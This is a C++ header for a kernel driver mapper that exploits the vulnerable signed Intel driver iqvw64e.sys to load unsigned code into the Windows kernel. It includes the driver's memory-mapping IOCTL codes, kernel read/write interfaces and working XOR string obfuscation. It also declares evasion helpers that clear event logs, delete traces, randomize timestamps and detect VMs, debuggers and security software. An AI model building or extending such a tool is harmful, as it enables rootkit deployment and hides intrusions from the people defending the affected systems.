/*
 * BYOVD Driver Mapper - Stealthy Kernel Driver Loading
 * Uses vulnerable signed drivers to map unsigned code into kernel
 * 
 * Anti-Detection Techniques:
 * - String obfuscation (compile-time XOR)
 * - Dynamic API resolution
 * - Minimal footprint
 * - Clean unload
 * 
 * WARNING: For educational purposes only!
 */

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <memory>
#include <random>
#include <filesystem>
#include <algorithm>

#include "logger.hpp"

#pragma comment(lib, "ntdll.lib")

namespace mapper {

// ============================================
// Compile-time String Obfuscation
// ============================================
namespace obfuscation {
    
    // Compile-time XOR key generation
    constexpr char XOR_KEY = 0x5A;
    
    // Compile-time string encryption
    template<size_t N>
    struct ObfuscatedString {
        char data[N];
        
        constexpr ObfuscatedString(const char (&str)[N]) {
            for (size_t i = 0; i < N; ++i) {
                data[i] = str[i] ^ XOR_KEY;
            }
        }
        
        std::string decrypt() const {
            std::string result;
            result.reserve(N - 1);
            for (size_t i = 0; i < N - 1; ++i) {
                result += data[i] ^ XOR_KEY;
            }
            return result;
        }
    };
    
    // Macro for easy obfuscation
    #define OBF(str) ([]() { \
        constexpr auto obf = mapper::obfuscation::ObfuscatedString(str); \
        return obf.decrypt(); \
    }())

} // namespace obfuscation

// ============================================
// Dynamic API Resolution (Anti-IAT Hook)
// ============================================
namespace api {
    
    // Function pointer types
    using NtLoadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
    using NtUnloadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
    using RtlInitUnicodeString_t = VOID(NTAPI*)(PUNICODE_STRING, PCWSTR);
    using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    
    // Dynamically resolved APIs
    struct ResolvedAPIs {
        NtLoadDriver_t NtLoadDriver = nullptr;
        NtUnloadDriver_t NtUnloadDriver = nullptr;
        RtlInitUnicodeString_t RtlInitUnicodeString = nullptr;
        RtlAdjustPrivilege_t RtlAdjustPrivilege = nullptr;
        
        bool Resolve() {
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            if (!ntdll) return false;
            
            NtLoadDriver = (NtLoadDriver_t)GetProcAddress(ntdll, "NtLoadDriver");
            NtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
            RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
            RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
            
            return NtLoadDriver && NtUnloadDriver && RtlInitUnicodeString && RtlAdjustPrivilege;
        }
    };
    
    inline ResolvedAPIs g_apis;
    
} // namespace api

// ============================================
// Intel Vulnerable Driver Interface
// ============================================
namespace intel {
    
    // IOCTL codes for iqvw64e.sys
    constexpr DWORD IOCTL_MAP_PHYSICAL = 0x80862007;
    constexpr DWORD IOCTL_UNMAP_PHYSICAL = 0x80862008;
    
    // Structures for communication with Intel driver
    #pragma pack(push, 1)
    struct MapPhysicalMemory {
        uint64_t PhysicalAddress;
        uint32_t Size;
        uint64_t OutVirtualAddress;
    };
    
    struct UnmapPhysicalMemory {
        uint64_t VirtualAddress;
    };
    #pragma pack(pop)
    
    // Intel driver handler
    class IntelDriver {
    private:
        HANDLE m_hDevice = INVALID_HANDLE_VALUE;
        std::wstring m_serviceName;
        std::wstring m_driverPath;
        bool m_loaded = false;
        
    public:
        IntelDriver() = default;
        ~IntelDriver() { Cleanup(); }
        
        // No copy
        IntelDriver(const IntelDriver&) = delete;
        IntelDriver& operator=(const IntelDriver&) = delete;
        
        bool Initialize(const std::wstring& driverPath);
        bool LoadDriver();
        bool UnloadDriver();
        void Cleanup();
        
        // Exploit functions
        bool MapPhysical(uint64_t physAddr, uint32_t size, uint64_t& outVirt);
        bool UnmapPhysical(uint64_t virtAddr);
        bool ReadPhysical(uint64_t physAddr, void* buffer, size_t size);
        bool WritePhysical(uint64_t physAddr, const void* buffer, size_t size);
        
        // Kernel memory operations
        bool ReadKernelMemory(uint64_t address, void* buffer, size_t size);
        bool WriteKernelMemory(uint64_t address, const void* buffer, size_t size);
        
        // Virtual address translation
        uint64_t TranslateVirtToPhys(uint64_t virtAddr, uint64_t dirBase);
        
        bool IsLoaded() const { return m_loaded; }
        HANDLE GetHandle() const { return m_hDevice; }
        
    private:
        std::wstring GenerateRandomServiceName();
        bool CreateDriverService();
        bool DeleteDriverService();
        bool EnableLoadDriverPrivilege();
    };
    
} // namespace intel

// ============================================
// PE Parser for Driver Mapping
// ============================================
namespace pe {
    
    struct ImportInfo {
        std::string ModuleName;
        std::string FunctionName;
        uint64_t* ThunkAddress;
    };
    
    class PEParser {
    public:
        bool Parse(const std::vector<uint8_t>& data);
        
        uint64_t GetImageSize() const { return m_imageSize; }
        uint64_t GetEntryPointRVA() const { return m_entryPointRVA; }
        uint64_t GetImageBase() const { return m_imageBase; }
        
        const std::vector<IMAGE_SECTION_HEADER>& GetSections() const { return m_sections; }
        std::vector<ImportInfo> GetImports() const;
        std::vector<std::pair<uint32_t, uint32_t>> GetRelocations() const;
        
    private:
        std::vector<uint8_t> m_data;
        uint64_t m_imageSize = 0;
        uint64_t m_entryPointRVA = 0;
        uint64_t m_imageBase = 0;
        std::vector<IMAGE_SECTION_HEADER> m_sections;
        IMAGE_NT_HEADERS64* m_ntHeaders = nullptr;
    };
    
} // namespace pe

// ============================================
// Kernel Symbol Resolution
// ============================================
namespace symbols {
    
    struct KernelModule {
        std::wstring Name;
        uint64_t Base;
        uint64_t Size;
    };
    
    class SymbolResolver {
    public:
        bool Initialize(intel::IntelDriver& driver);
        
        uint64_t GetKernelBase() const { return m_kernelBase; }
        uint64_t ResolveExport(const std::string& moduleName, const std::string& funcName);
        
        std::vector<KernelModule> EnumerateModules();
        
    private:
        intel::IntelDriver* m_driver = nullptr;
        uint64_t m_kernelBase = 0;
        std::vector<KernelModule> m_modules;
        
        uint64_t FindKernelBase();
        uint64_t GetModuleExport(uint64_t moduleBase, const std::string& funcName);
    };
    
} // namespace symbols

// Forward declaration
namespace workitem { class WorkItemExecutor; }

// ============================================
// Main Driver Mapper
// ============================================
class DriverMapper {
public:
    enum class Status {
        Success,
        FailedToInitialize,
        FailedToLoadVulnDriver,
        FailedToParseDriver,
        FailedToAllocateMemory,
        FailedToMapSections,
        FailedToResolveImports,
        FailedToApplyRelocations,
        FailedToCallEntry,
        FailedToExecuteShellcode
    };
    
    DriverMapper() = default;
    ~DriverMapper() { Cleanup(); }
    
    // Initialize with path to Intel driver (iqvw64e.sys)
    Status Initialize(const std::wstring& vulnDriverPath);
    
    // Map driver from file
    Status MapDriver(const std::wstring& driverPath);
    
    // Map driver from memory
    Status MapDriver(const std::vector<uint8_t>& driverData);
    
    // Cleanup (unload vulnerable driver)
    void Cleanup();
    
    // Get last error string
    std::string GetLastError() const { return m_lastError; }
    
    // Get mapped driver base address
    uint64_t GetMappedBase() const { return m_mappedBase; }
    
    // Access to internal components (for advanced usage)
    intel::IntelDriver& GetIntelDriver() { return m_intelDriver; }
    symbols::SymbolResolver& GetSymbolResolver() { return m_symbolResolver; }
    
private:
    intel::IntelDriver m_intelDriver;
    symbols::SymbolResolver m_symbolResolver;
    pe::PEParser m_peParser;
    workitem::WorkItemExecutor* m_workItemExecutor = nullptr;
    
    uint64_t m_mappedBase = 0;
    std::string m_lastError;
    
    bool AllocateKernelMemory(uint64_t size, uint64_t& outAddress);
    bool MapSections(const std::vector<uint8_t>& data, uint64_t baseAddress);
    bool ResolveImports(uint64_t baseAddress);
    bool ApplyRelocations(uint64_t baseAddress, uint64_t delta);
    bool CallDriverEntry(uint64_t entryPoint);
    bool InitializeWorkItemExecutor();
};

// ============================================
// Anti-Detection Helpers
// ============================================
namespace antidetect {
    
    // Randomize driver file timestamps
    bool RandomizeTimestamps(const std::wstring& filePath);
    
    // Delete driver traces from disk
    bool SecureDelete(const std::wstring& filePath);
    
    // Clear event logs (requires admin)
    bool ClearEventLogs();
    
    // Check if running in VM/sandbox
    bool IsVirtualMachine();
    
    // Check for debugger
    bool IsDebuggerPresent();
    
    // Check for known security software
    bool IsSecuritySoftwareRunning();
    
    // Get random delay to avoid timing patterns
    void RandomDelay(uint32_t minMs, uint32_t maxMs);
    
} // namespace antidetect

} // namespace mapper

